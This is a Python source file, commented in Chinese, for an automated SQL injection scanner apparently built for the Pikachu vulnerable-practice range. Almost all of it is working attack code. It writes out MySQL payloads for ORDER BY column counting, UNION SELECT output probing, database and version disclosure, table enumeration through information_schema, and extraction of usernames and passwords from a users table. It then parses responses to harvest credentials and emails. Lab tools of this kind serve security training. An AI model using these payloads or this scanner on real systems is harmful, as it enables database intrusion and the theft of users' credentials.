import requests
from urllib.parse import urlparse, urljoin, parse_qs
import time
from bs4 import BeautifulSoup
import re
import difflib

class SQLInjectionScanner:
    """SQL注入扫描器核心类"""
    
    def __init__(self, base_url, output_callback=None, progress_callback=None, changes_callback=None):
        """
        初始化扫描器
        
        参数:
            base_url: 靶场基础URL
            output_callback: 输出回调函数，用于将信息传递给GUI
            progress_callback: 进度更新回调函数，用于更新GUI进度条
            changes_callback: 页面变化回调函数，用于将页面变化信息传递给GUI
        """
        self.base_url = base_url
        self.output_callback = output_callback  # 输出回调函数，用于GUI
        self.progress_callback = progress_callback
        self.changes_callback = changes_callback  # 页面变化回调函数
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        # 存储基准响应，用于比较关键差异
        self.base_responses = {}
        # 缓存最近的请求和响应，避免重复比较
    
    def print(self, message):
        """自定义打印方法，支持控制台和GUI输出"""
        if self.output_callback:
            self.output_callback(message + '\n')
        else:
            print(message)
            
    def update_progress(self, value, status=None):
        """
        更新进度
        
        参数:
            value: 进度值(0-100)
            status: 可选的状态消息
        """
        if self.progress_callback:
            self.progress_callback(value, status)
    
    def test_connection(self):
        """测试与靶场的连接"""
        test_url = f"{self.base_url}/index.php"
        try:
            response = self.session.get(test_url, timeout=5)
            if response.status_code == 200:
                self.print("[+] 成功连接到Pikachu靶场")
                return True
            else:
                self.print(f"[-] 连接测试失败，状态码: {response.status_code}")
                return False
        except Exception as e:
            self.print(f"[!] 连接测试失败: {e}")
            return False
        
    def _extract_content_preview(self, response):
        """从响应中提取完整内容"""
        try:
            # 尝试解析HTML并获取完整文本内容
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text(separator=' ', strip=True)
            # 返回完整内容
            return text
        except:
            # 如果解析失败，直接返回完整原始文本
            return response.text
    
    def _get_base_response(self, url, method='GET', param_key=None):
        """获取基准响应（空输入或正常输入的响应），用于比较差异"""
        # 生成缓存键
        cache_key = f"{url}:{method}:{param_key}"
        
        # 检查缓存中是否已有基准响应
        if cache_key in self.base_responses:
            return self.base_responses[cache_key]
        
        # 构建空参数或正常参数
        try:
            if method.upper() == 'GET':
                # 不包含测试参数的请求
                base_params = {}
                if param_key:
                    base_params[param_key] = ''  # 空值作为基准
                    # 如果有submit参数，也加上
                    if 'submit' in str(param_key):
                        base_params['submit'] = '查询'
                response = self.session.get(url, params=base_params, timeout=5, allow_redirects=False)
            else:  # POST
                # 空POST数据或只包含空参数字段
                base_data = {}
                if param_key:
                    base_data[param_key] = ''  # 空值作为基准
                response = self.session.post(url, data=base_data, timeout=5, allow_redirects=False)
            
            # 提取基准响应内容
            base_content = self._extract_content_preview(response)
            # 缓存基准响应
            self.base_responses[cache_key] = base_content
            return base_content
        except Exception:
            # 如果获取基准响应失败，返回空字符串
            return ""
    
    def _extract_key_differences(self, content, base_content):
        """提取并返回网页的关键变化部分"""
        if not content or content == base_content:
            # 如果内容相同，返回提示信息
            return "[响应内容] 内容与基准响应相同或无变化"
        
        # 提取纯文本内容以便更好地比较差异
        def get_plain_text(html):
            try:
                soup = BeautifulSoup(html, 'html.parser')
                # 去除所有script和style标签
                for script in soup(['script', 'style']):
                    script.decompose()
                # 获取纯文本
                text = soup.get_text()
                # 去除多余空白字符
                import re
                text = re.sub(r'\s+', ' ', text).strip()
                return text
            except:
                return str(html)
        
        # 获取纯文本内容
        plain_content = get_plain_text(content)
        plain_base_content = get_plain_text(base_content)
        
        # 使用序列匹配算法找出差异
        import difflib
        
        # 将文本分割成单词或句子进行比较
        # 这里使用简单的分割，按空格分割成单词
        content_words = plain_content.split()
        base_words = plain_base_content.split()
        
        # 使用差异比较器
        differ = difflib.Differ()
        diff_result = list(differ.compare(base_words, content_words))
        
        # 提取只有在当前响应中出现的内容（以'+'开头的部分）
        added_content = []
        for item in diff_result:
            if item.startswith('+'):
                added_content.append(item[2:])  # 去掉'+'和空格
        
        # 如果找到了差异内容，返回这些内容
        if added_content:
            # 将差异内容连接成句子
            diff_text = ' '.join(added_content)
            
            # 尝试进一步优化，提取可能的关键信息
            import re
            
            # 匹配常见的用户信息模式，如 uid、email 等
            user_info_patterns = [
                r'(your uid:.*?)(?=\s+your|$)',  # 匹配 uid 信息
                r'(your email is:.*?)(?=\s+your|$)',  # 匹配 email 信息
                r'(password is:.*?)(?=\s+your|$)',  # 匹配密码信息
                r'(username:.*?)(?=\s+|$)',  # 匹配用户名信息
                r'(\w+\s*=\s*[\w\d]+)',  # 匹配 key=value 格式
                r'(id\s*:\s*\d+)',  # 匹配 id:数字 格式
            ]
            
            # 收集所有匹配的关键信息
            key_infos = []
            for pattern in user_info_patterns:
                matches = re.findall(pattern, diff_text, re.IGNORECASE)
                key_infos.extend(matches)
            
            # 如果找到了关键信息，优先显示这些信息
            if key_infos:
                # 去重
                key_infos = list(set(key_infos))
                return "\n".join(key_infos)
            
            # 如果没有找到特定的关键信息，但有差异内容，返回差异内容
            if diff_text:
                # 限制差异内容长度，避免过长
                if len(diff_text) > 500:
                    return diff_text[:497] + "..."
                return diff_text
        
        # 如果通过单词比较没有找到差异，尝试通过段落比较
        # 将文本按换行符分割成段落
        content_paragraphs = plain_content.split('\n')
        base_paragraphs = plain_base_content.split('\n')
        
        # 找出只在当前响应中出现的段落
        added_paragraphs = []
        for para in content_paragraphs:
            para_stripped = para.strip()
            if para_stripped and not any(para_stripped in base_para for base_para in base_paragraphs):
                added_paragraphs.append(para_stripped)
        
        # 如果找到了新增段落，返回这些段落
        if added_paragraphs:
            # 限制返回的段落数量和长度
            relevant_paragraphs = []
            max_length = 500
            current_length = 0
            
            for para in added_paragraphs:
                # 优先选择看起来包含关键信息的段落
                if any(keyword in para.lower() for keyword in ['uid', 'email', 'password', 'user', 'admin', 'id=']):
                    if current_length + len(para) <= max_length:
                        relevant_paragraphs.append(para)
                        current_length += len(para) + 3  # 加上分隔符的长度
            
            # 如果没有找到特别相关的段落，就选择较短的新增段落
            if not relevant_paragraphs:
                for para in added_paragraphs:
                    if len(para) > 10:  # 过滤掉太短的段落（可能是空白或无意义的）
                        if current_length + len(para) <= max_length:
                            relevant_paragraphs.append(para)
                            current_length += len(para) + 3
            
            if relevant_paragraphs:
                return "\n".join(relevant_paragraphs)
        
        # 如果以上方法都没有找到明显的差异，但我们知道内容确实不同
        # 就返回原始内容的摘要，但添加一个提示
        if len(plain_content) > 500:
            return plain_content[:497] + "..."
        return plain_content
    
    def send_request(self, url, method='GET', data=None, params=None, record_io=True):
        """发送HTTP请求，支持GET和POST方法"""
        max_retries = 2
        request_info = {
            'url': url,
            'method': method.upper(),
            'params': params if params else {},
            'data': data if data else {}
        }
        
        # 确定当前测试的参数字段名
        test_param_key = None
        if params and len(params) == 1:
            test_param_key = list(params.keys())[0]
        elif params and len(params) == 2 and 'submit' in params:
            # 特殊处理带submit参数的情况
            for key in params:
                if key != 'submit':
                    test_param_key = key
                    break
        elif data and len(data) == 1:
            test_param_key = list(data.keys())[0]
        
        for attempt in range(max_retries):
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, params=params, timeout=8)
                else:  # POST
                    response = self.session.post(url, data=data, timeout=8)
                
                # 如果需要记录输入输出且有回调函数，则发送信息
                if record_io and self.changes_callback:
                    # 提取完整的响应内容预览
                    full_content = self._extract_content_preview(response)
                    
                    # 获取基准响应
                    base_content = self._get_base_response(url, method, test_param_key)
                    
                    # 提取关键差异
                    key_differences = self._extract_key_differences(full_content, base_content)
                    
                    # 提取响应的关键信息
                    response_info = {
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_type': response.headers.get('Content-Type', 'unknown'),
                        # 只发送关键差异作为预览
                        'content_preview': key_differences,
                        # 添加差异标记，便于GUI显示
                        'has_differences': key_differences != full_content
                    }
                    
                    # 创建输入输出记录
                    io_record = {
                        'input': request_info,
                        'output': response_info,
                        'timestamp': time.strftime('%H:%M:%S')
                    }
                    
                    # 调用回调函数
                    self.changes_callback(io_record)
                
                return response
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt < max_retries - 1:
                    self.print(f"[!] 请求出错 ({e})，正在重试 ({attempt+1}/{max_retries})...")
                    time.sleep(2)
                    continue
                else:
                    self.print(f"[!] 请求最终失败: {e}")
                    # 即使失败也发送失败信息
                    if record_io and self.changes_callback:
                        error_info = {
                            'input': request_info,
                            'output': {'error': str(e), 'status': 'failed'},
                            'timestamp': time.strftime('%H:%M:%S')
                        }
                        self.changes_callback(error_info)
                    return None
            except requests.exceptions.RequestException as e:
                self.print(f"[!] 请求出错: {e}")
                # 即使失败也发送失败信息
                if record_io and self.changes_callback:
                    error_info = {
                        'input': request_info,
                        'output': {'error': str(e), 'status': 'failed'},
                        'timestamp': time.strftime('%H:%M:%S')
                    }
                    self.changes_callback(error_info)
                return None

    def is_vulnerable(self, response):
        """检查响应中是否包含数据库错误信息"""
        db_errors = {
            "MySQL": (
                "you have an error in your sql syntax", 
                "warning: mysql", 
                "mysql_fetch_array",
                "supplied argument is not a valid mysql result",
                "sql syntax.*mysql",
                "unknown column",
            )
        }
        
        if not response:
            return False, None
            
        response_text = response.text.lower()
        for db_type, errors in db_errors.items():
            if any(error in response_text for error in errors):
                return True, db_type
        return False, None

    def check_boolean_based(self, url, true_payload, false_payload, method='GET', param='id', data_template=None):
        """基于布尔的盲注检测"""
        if method.upper() == 'GET':
            true_response = self.send_request(url, params={param: true_payload})
            false_response = self.send_request(url, params={param: false_payload})
        else:  # POST
            true_data = data_template.copy() if data_template else {}
            true_data[param] = true_payload
            false_data = data_template.copy() if data_template else {}
            false_data[param] = false_payload
            true_response = self.send_request(url, method='POST', data=true_data)
            false_response = self.send_request(url, method='POST', data=false_data)
        
        if true_response and false_response:
            # 比较响应长度和内容哈希
            if len(true_response.content) != len(false_response.content):
                return True
            # 检查页面特定关键词的变化
            if "admin" in true_response.text.lower() and "admin" not in false_response.text.lower():
                return True
        return False

    def detect_column_count(self, url, method, param, data_template, closing_pattern):
        """通过ORDER BY判断字段数"""
        self.print(f"[*] 正在判断字段数...")
        
        # 为字段检测设置进度
        total_tests = 10  # 最多测试10个字段
        tests_done = 0
        
        # 首先尝试使用ORDER BY 来快速确定字段数
        for i in range(1, 11):  # 测试到10个字段
            if closing_pattern == "string":
                test_payload = f"vince' ORDER BY {i} # "
            elif closing_pattern == "search":
                test_payload = f"a' ORDER BY {i} # "
            elif closing_pattern == "xx":
                test_payload = f"1') ORDER BY {i} # "
            else:  # numeric
                test_payload = f"1 ORDER BY {i}"
            
            if method == 'GET':
                response = self.send_request(url, params={param: test_payload, 'submit': '查询'})
            else:
                data = data_template.copy() if data_template else {}
                data[param] = test_payload
                response = self.send_request(url, method='POST', data=data)
            
            tests_done += 1
            self.update_progress(min(100, int(tests_done / total_tests * 10)), f"检测字段数: {i}")
            
            if response:
                # 检查是否出现错误
                is_vul, _ = self.is_vulnerable(response)
                
                # 如果出现错误，说明字段数超了
                if is_vul:
                    if i == 1:  # ORDER BY 1就出错，可能是其他问题
                        continue
                    column_count = i - 1
                    self.print(f"[+] 判断出字段数为: {column_count}")
                    return column_count
                else:
                    self.print(f"[*] 字段数可能 >= {i}")
            else:
                break
                
        # 如果ORDER BY没有找到，尝试使用UNION查询直接确定
        self.print("[*] 使用ORDER BY检测失败，尝试使用UNION查询直接确定")
        self.print("[-] 无法准确判断字段数，尝试使用默认值2")
        return 2  # Pikachu大多数情况是2个字段

    def detect_output_positions(self, url, method, param, data_template, closing_pattern, column_count):
        """
        通过比较union select 1,1和union select 2,2的输出来确定网页信息的输出位置
        
        参数:
            url: 测试URL
            method: 请求方法
            param: 参数名
            data_template: 数据模板
            closing_pattern: 闭合模式
            column_count: 字段数
            
        返回:
            dict: 包含输出位置和相应正则表达式的字典
        """
        self.print("[*] 正在检测数据输出位置...")
        
        # 构造union select 1,1和union select 2,2的payload
        select_ones = ",".join(["1"] * column_count)
        select_twos = ",".join(["2"] * column_count)
        
        if closing_pattern == "string":
            payload_ones = f"vince' union select {select_ones} # "
            payload_twos = f"vince' union select {select_twos} # "
        elif closing_pattern == "search":
            payload_ones = f"vince' union select {select_ones} # "
            payload_twos = f"vince' union select {select_twos} # "
        elif closing_pattern == "xx":
            payload_ones = f"1') union select {select_ones} # "
            payload_twos = f"1') union select {select_twos} # "
        else:  # numeric
            payload_ones = f"1 union select {select_ones}"
            payload_twos = f"1 union select {select_twos}"
        
        # 发送两个请求
        if method == 'GET':
            response_ones = self.send_request(url, params={param: payload_ones, 'submit': '查询'})
            response_twos = self.send_request(url, params={param: payload_twos, 'submit': '查询'})
        else:
            data_ones = data_template.copy() if data_template else {}
            data_ones[param] = payload_ones
            data_twos = data_template.copy() if data_template else {}
            data_twos[param] = payload_twos
            response_ones = self.send_request(url, method='POST', data=data_ones)
            response_twos = self.send_request(url, method='POST', data=data_twos)
        
        if response_ones and response_twos:
            soup_ones = BeautifulSoup(response_ones.text, 'html.parser')
            text_ones = soup_ones.get_text()
            soup_twos = BeautifulSoup(response_twos.text, 'html.parser')
            text_twos = soup_twos.get_text()
            
            # 比较两个响应的差异
            changes = extract_page_changes(text_ones, text_twos, scanner=self)
            
            # 分析差异，找出包含"1"和"2"的位置
            output_positions = []
            for change in changes['added']:
                if "2" in change:
                    # 替换"2"为捕获组，创建正则表达式模式
                    # 这里简单处理，实际可能需要更复杂的逻辑
                    pattern = re.escape(change).replace("\\2", "(.*?)")
                    output_positions.append(pattern)
            
            if output_positions:
                self.print(f"[+] 成功检测到输出位置，找到 {len(output_positions)} 个可能的数据输出点")
                return {
                    'output_positions': output_positions,
                    'custom_pattern': ".*?".join(output_positions) if len(output_positions) > 1 else output_positions[0]
                }
            else:
                # 如果无法自动检测，尝试使用传统方法
                self.print("[-] 无法自动检测输出位置，使用默认模式")
                # 返回空结果，让调用方使用默认模式
                return None
        
        self.print("[-] 检测输出位置失败")
        return None
    
    def extract_with_union(self, url, method, param, data_template, closing_pattern, column_count):
        """使用UNION查询提取数据"""
        self.print(f"[*] 尝试使用UNION查询提取数据...")
        
        # 检测数据输出位置，动态生成正则表达式
        output_info = self.detect_output_positions(url, method, param, data_template, closing_pattern, column_count)
        
        # 构造union select payload
        select_parts = []
        for i in range(1, column_count + 1):
            select_parts.append(str(i))
        
        union_select = ",".join(select_parts)
        
        # 根据不同的闭合模式构造payload
        if closing_pattern == "string":
            union_payload = f"vince' union select {union_select} # "
        elif closing_pattern == "search":
            union_payload = f"vince' union select {union_select} # "
        elif closing_pattern == "xx":
            union_payload = f"1') union select {union_select} # "
        else:  # numeric
            union_payload = f"1 union select {union_select}"
        
        # 发送请求并与标准请求比较变化
        standard_input = {"string": "vince", "search": "a", "xx": "1", "numeric": "1"}
        
        if method == 'GET':
            response = self.send_request(url, params={param: union_payload, 'submit': '查询'})
            # 获取标准响应用于比较
            standard_response = self.send_request(url, params={param: standard_input[closing_pattern], 'submit': '查询'})
        else:
            data = data_template.copy() if data_template else {}
            data[param] = union_payload
            response = self.send_request(url, method='POST', data=data)
            # 获取标准响应用于比较
            standard_data = data_template.copy() if data_template else {}
            standard_data[param] = standard_input[closing_pattern]
            standard_response = self.send_request(url, method='POST', data=standard_data)
        
        # 比较响应差异，确保所有注入类型都能捕获页面变化
        if standard_response and response:
            soup_standard = BeautifulSoup(standard_response.text, 'html.parser')
            text_standard = soup_standard.get_text()
            soup_response = BeautifulSoup(response.text, 'html.parser')
            text_response = soup_response.get_text()
            
            # 直接比较并调用回调函数，确保所有类型注入都能捕获页面变化
            extract_page_changes(text_standard, text_response, scanner=self)
        
        if response:
            self.print("[+] UNION查询成功，开始提取数据...")
            
            # 提取数据库信息
            self.extract_database_info(url, method, param, data_template, closing_pattern, column_count, output_info)
            
            # 提取表信息
            tables = self.extract_tables(url, method, param, data_template, closing_pattern, column_count, output_info)
            
            # 提取用户数据 - 即使没有检测到tables或users表，也尝试提取
            # 这样可以确保在所有注入类型中都能捕获页面变化
            self.extract_user_data(url, method, param, data_template, closing_pattern, column_count, output_info)
            
            return True
        return False

    def extract_database_info(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
        """提取数据库信息"""
        self.print("[*] 提取数据库信息...")
        select_parts = []
        for i in range(1, column_count):
            select_parts.append(str(i))
        
        union_select = ",".join(select_parts)
        
        if column_count >= 2:
            if closing_pattern == "string":
                payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
            elif closing_pattern == "search":
                payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
            elif closing_pattern == "xx":
                payload = f"1') union select {union_select},concat(database(),'|',version()) # "
            else:
                payload = f"1 union select {union_select},concat(database(),'|',version())"
            
            if method == 'GET':
                response = self.send_request(url, params={param: payload, 'submit': '查询'})
            else:
                data = data_template.copy() if data_template else {}
                data[param] = payload
                response = self.send_request(url, method='POST', data=data)
            
            if response:
                # 使用正则表达式提取数据库信息
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                # 优先使用动态生成的正则表达式
                database_info_found = False
                if output_info and 'output_positions' in output_info:
                    self.print("[*] 使用动态生成的正则表达式提取数据库信息...")
                    for pattern in output_info['output_positions']:
                        matches = re.findall(pattern, text)
                        for match in matches:
                            # 检查匹配结果是否包含数据库信息特征
                            if 'pikachu' in match.lower() or '.' in match and re.search(r'\d+\.\d+\.\d+', match):
                                self.print(f"[+] 数据库信息 (动态匹配): {match}")
                                database_info_found = True
                                break
                        if database_info_found:
                            break
                
                # 如果动态匹配失败，使用默认模式
                if not database_info_found:
                    self.print("[*] 使用默认模式提取数据库信息...")
                    # 查找包含数据库信息的模式
                    patterns = [
                        r'pikachu\|[0-9]+\.[0-9]+\.[0-9]+',
                        r'pikachu',
                        r'[0-9]+\.[0-9]+\.[0-9]+'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, text)
                        if matches:
                            self.print(f"[+] 数据库信息 (默认模式): {matches[0]}")
                            database_info_found = True
                            break
                
                if not database_info_found:
                    self.print("[-] 无法提取数据库信息")

    def extract_tables(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
        """提取数据库表信息"""
        self.print("[*] 提取数据库表信息...")
        select_parts = []
        for i in range(1, column_count):
            select_parts.append(str(i))
        union_select = ",".join(select_parts)

        standard_input = {
            "numeric": "1",
            "string": "vince",
            "search": "vince",
            "xx": "1",
        }
        patterns = {
            "numeric": r'hello,(.*?)\s*your email is:\s*(.*?)(?=hello,|\Z)',
            "string": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
            "search": r'username：\s*(.*?)uid:(.*?)email is:\s*(.*?)(?=username：|\Z)',
            "xx": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
        }
        

        if closing_pattern == "string":
            payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
        elif closing_pattern == "search":
            payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
        elif closing_pattern == "xx":
            payload = f"1') union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
        else:
            payload = f"1 union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database()"
        
        if method == 'GET':
            response = self.send_request(url, params={param: payload, 'submit': '查询'})
            standard_response = self.send_request(url, params={param: standard_input[f'{closing_pattern}'], 'submit': '查询'})
        else:
            data = data_template.copy() if data_template else {}
            data[param] = payload
            response = self.send_request(url, method='POST', data=data)
            standard_data = data_template.copy() if data_template else {}
            standard_data[param] = standard_input[f'{closing_pattern}']
            standard_response = self.send_request(url, method='POST', data=standard_data)
        
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            standard_soup = BeautifulSoup(standard_response.text, 'html.parser')
            standard_text = standard_soup.get_text()
            res = extract_page_changes(standard_text, text, scanner=self)
            
            # 优先使用动态生成的正则表达式
            tables_found = False
            tables = []
            
            if output_info and 'output_positions' in output_info:
                self.print("[*] 使用动态生成的正则表达式提取表信息...")
                for pattern in output_info['output_positions']:
                    # 首先查找新增内容中的匹配
                    for added_content in res['added']:
                        matches = re.findall(pattern, added_content)
                        for match in matches:
                            # 提取表名（通常是逗号分隔的多个表名）
                            if match and (',' in match or 'users' in match or 'emails' in match):
                                tables = [t.strip() for t in re.split(r'[,;]', match) if t.strip()]
                                tables_found = True
                                break
                        if tables_found:
                            break
                    if tables_found:
                        break
            
            # 如果动态匹配失败，使用默认模式
            if not tables_found:
                self.print("[*] 使用默认模式提取表信息...")
                pattern = patterns[f'{closing_pattern}']

                # 使用findall方法查找所有匹配项
                matches = []
                for _ in res['added']:
                    matches += re.findall(pattern, _)

                # 处理并打印结果
                if matches:
                    for i, (*arg, email) in enumerate(matches, 1):
                        # 去除email字段可能的首尾空白字符
                        clean_email = email.strip()
                        tables += re.split(r'[,;]', clean_email)
                    tables_found = True
                else:
                    self.print("[*] 尝试直接在页面文本中查找表名...")
                    # 尝试直接在页面文本中查找常见的表名模式
                    potential_tables = re.findall(r'(?:users?|emails?|members?|admin(?:s|_users)?|accounts?)(?=[,;\s]|$)', text)
                    if potential_tables:
                        tables = list(set(potential_tables))  # 去重
                        tables_found = True
            
            # 过滤并打印表名
            if tables:
                # 过滤掉可能的非表名字符串
                filtered_tables = []
                for table in tables:
                    # 表名通常只包含字母、数字和下划线
                    if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', table):
                        filtered_tables.append(table)
                
                if filtered_tables:
                    self.print(f"所有数据库表名：")
                    for table in filtered_tables:
                        self.print(table)
                    return filtered_tables
                else:
                    # 如果过滤后没有有效表名，返回原始表名（可能包含噪声）
                    self.print(f"所有可能的数据库表名：")
                    for table in tables:
                        self.print(table)
                    return tables
            else:
                self.print("未找到匹配的表名。")
        return None

    def extract_user_data(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
        """提取用户数据"""
        self.print("[*] 提取用户数据...")
        standard_input = {
            "string": "vince",
            "search": "a",
            "xx": "1",
            "numeric": "1",
        }
        patterns = {
            "numeric": r'hello,(.*?)\s*your email is:\s*(.*?)(?=hello,|\Z)',
            "string": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
            "search": r'username：\s*(.*?)uid:(.*?)email is:\s*(.*?)(?=username：|\Z)',
            "xx": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
        }
        
        if closing_pattern == "string":
            payload = f"vince' union select username,password from users # "
        elif closing_pattern == "search":
            payload = f"vince' union select 1,username,password from users # "
        elif closing_pattern == "xx":
            payload = f"1') union select username,password from users # "
        else:
            payload = f"1 union select username,password from users"
        
        if method == 'GET':
            response = self.send_request(url, params={param: payload, 'submit': '查询'})
            standard_response = self.send_request(url, params={param: standard_input[f'{closing_pattern}'], 'submit': '查询'})
        else:
            data = data_template.copy() if data_template else {}
            data[param] = payload
            response = self.send_request(url, method='POST', data=data)
            standard_data = data_template.copy() if data_template else {}
            standard_data[param] = standard_input[f'{closing_pattern}']
            standard_response = self.send_request(url, method='POST', data=standard_data)
        
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            standard_soup = BeautifulSoup(standard_response.text, 'html.parser')
            standard_text = standard_soup.get_text()
            res = extract_page_changes(standard_text, text, scanner=self)
            
            # 优先使用动态生成的正则表达式
            user_data_found = False
            
            if output_info and 'output_positions' in output_info:
                self.print("[*] 使用动态生成的正则表达式提取用户数据...")
                # 查找所有可能包含用户数据的匹配
                all_matches = []
                
                for pattern in output_info['output_positions']:
                    # 查找新增内容中的匹配
                    for added_content in res['added']:
                        matches = re.findall(pattern, added_content)
                        all_matches.extend(matches)
                
                # 分析匹配结果，尝试识别用户名和密码
                if all_matches:
                    self.print("\n找到的用户数据 (动态匹配):")
                    for i, match in enumerate(all_matches, 1):
                        if isinstance(match, tuple):
                            for j, field in enumerate(match):
                                if field.strip():
                                    self.print(f"记录 {i}, 字段 {j}: {field.strip()}")
                        else:
                            if match.strip():
                                self.print(f"记录 {i}: {match.strip()}")
                    user_data_found = True
            
            # 如果动态匹配失败，使用默认模式
            if not user_data_found:
                self.print("[*] 使用默认模式提取用户数据...")
                pattern = patterns[f'{closing_pattern}']
                
                # 查找所有匹配项
                matches = []
                for _ in res['added']:
                    matches += re.findall(pattern, _)
                
                # 转换为结构化的字典列表并打印
                if matches:
                    for match in matches:
                        self.print("")
                        for i in range(len(match)):
                            self.print(f"{i}: {match[i]}")
                    user_data_found = True
                else:
                    # 尝试直接在新增内容中查找用户名和密码格式的数据
                    self.print("[*] 尝试直接在页面中查找用户数据...")
                    user_patterns = [
                        r'(?:admin|user|test)\s*[:=]\s*([^\s,]+)',  # 用户名模式
                        r'(?:pass|pwd)\s*[:=]\s*([^\s,]+)',         # 密码模式
                        r'([a-zA-Z0-9_]+)\s*[:=]\s*([a-f0-9]{32})'    # 用户名=MD5密码模式
                    ]
                    
                    found_data = False
                    for added_content in res['added']:
                        for user_pattern in user_patterns:
                            user_matches = re.findall(user_pattern, added_content)
                            if user_matches:
                                for user_match in user_matches:
                                    if isinstance(user_match, tuple):
                                        self.print(f"用户名: {user_match[0]}, 密码: {user_match[1]}")
                                    else:
                                        self.print(f"用户数据: {user_match}")
                                    found_data = True
                    
                    if found_data:
                        user_data_found = True
                
            if not user_data_found:
                self.print("[-] 无法提取用户数据")

# 辅助函数
def extract_page_changes(text_a, text_b, scanner=None, output_file=None):
    """
    比较两个BeautifulSoup文本的差异，提取网页的实际输出变化
    
    参数:
        text_a: 第一个soup.get_text()结果
        text_b: 第二个soup.get_text()结果  
        scanner: 扫描器实例，用于调用回调函数
        output_file: 可选，将结果保存到文件
    
    返回:
        dict: 包含差异详细信息的字典
    """
    
    # 预处理文本：按行分割并清理空行
    lines_a = [line.strip() for line in text_a.splitlines() if line.strip()]
    lines_b = [line.strip() for line in text_b.splitlines() if line.strip()]
    
    # 使用difflib进行精确比较
    differ = difflib.Differ()
    diff_result = list(differ.compare(lines_a, lines_b))
    
    # 提取差异信息
    changes = {
        'added': [],      # B中新增的内容
        'removed': [],    # A中有但B中删除的内容  
        'modified': [],   # 修改的内容
        'all_changes': [], # 所有变化行
        'change_ratio': 0  # 变化比例
    }
    
    # 分析差异结果
    for line in diff_result:
        if line.startswith('+ '):
            # B中新增的行
            change = line[2:].strip()
            changes['added'].append(change)
            changes['all_changes'].append(('added', change))
        elif line.startswith('- '):
            # A中有但B中删除的行
            change = line[2:].strip()
            changes['removed'].append(change)
            changes['all_changes'].append(('removed', change))
        elif line.startswith('? '):
            # 修改标记（在+或-之后出现）
            pass
        elif line.startswith('  '):
            # 未变化的内容
            pass
    
    # 如果有重要变化且提供了scanner实例，调用回调函数
    if scanner and scanner.changes_callback and changes.get('added'):
        # 检查是否有真正有意义的变化（优化过滤规则以确保用户数据相关的变化能够被捕获）
        significant_changes = []
        # 用户数据相关的关键词
        user_data_keywords = ['admin', 'user', 'pass', 'pwd', 'password', 'username', 'uid', 'email']
        
        for change in changes['added']:
            # 降低长度限制，同时检查是否包含用户数据关键词
            # 对于可能包含用户数据的变化，即使较短也应该保留
            is_user_data = any(keyword in change.lower() for keyword in user_data_keywords)
            is_short_but_meaningful = len(change) > 2 and len(change) <= 5 and re.match(r'^[a-zA-Z0-9_]+$', change)
            is_normal_significant = len(change) > 5
            
            # 排除常见的固定文本，但不排除可能包含用户数据的内容
            is_ignored = any(ignored in change.lower() for ignored in 
                           ['pikachu', '登录', '注册', '退出', '首页', 'welcome'])
            
            if (is_user_data or is_short_but_meaningful or is_normal_significant) and not is_ignored:
                significant_changes.append(change)
        
        if significant_changes:
            # 创建只包含重要变化的结果
            important_changes = {
                'added': significant_changes,
                'removed': changes['removed'],
                'all_changes': changes['all_changes']
            }
            # 调用回调函数
            scanner.changes_callback(important_changes)
    
    return changes